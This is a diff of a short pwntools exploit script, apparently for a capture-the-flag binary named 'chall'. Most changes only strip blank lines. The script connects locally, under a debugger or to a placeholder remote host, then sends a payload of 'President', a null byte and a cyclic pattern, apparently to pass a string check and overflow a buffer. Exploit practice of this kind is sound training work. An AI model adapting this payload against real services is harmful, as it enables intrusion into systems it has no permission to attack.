@@ -5,32 +5,20 @@ exe = ELF("./chall")
 context.binary = exe
 context.log_level = 'debug'
 context.terminal = ["cmd.exe", "/c", "start", "wsl.exe", "-e"]
-
 # context.arch = 'amd64' 
-
 # libc = ELF("./libc.so.6", checksec=False)
 # ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
-
-
 gdbscript = '''
-
 c
 '''
-
 def conn():
-    
     if args.REMOTE:
         return remote("HOST_ADDRESS", 1337)
-    
     elif args.GDB:
         return gdb.debug([exe.path], gdbscript=gdbscript)
-    
     else:
-        
         # return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
-        
         return process([exe.path])
-
 p = conn()
 
 def sla(delim, data): return p.sendlineafter(delim, data)
@@ -42,11 +30,8 @@ def rl():             return p.recvline()
 def r(n):             return p.recv(n)
 
 # --- Exploit ---
-
 # Payload 
 payload = b"President" + b'\x00' + cyclic(22)
-
-
 sa(b'name: \n', payload)
 
 p.interactive()
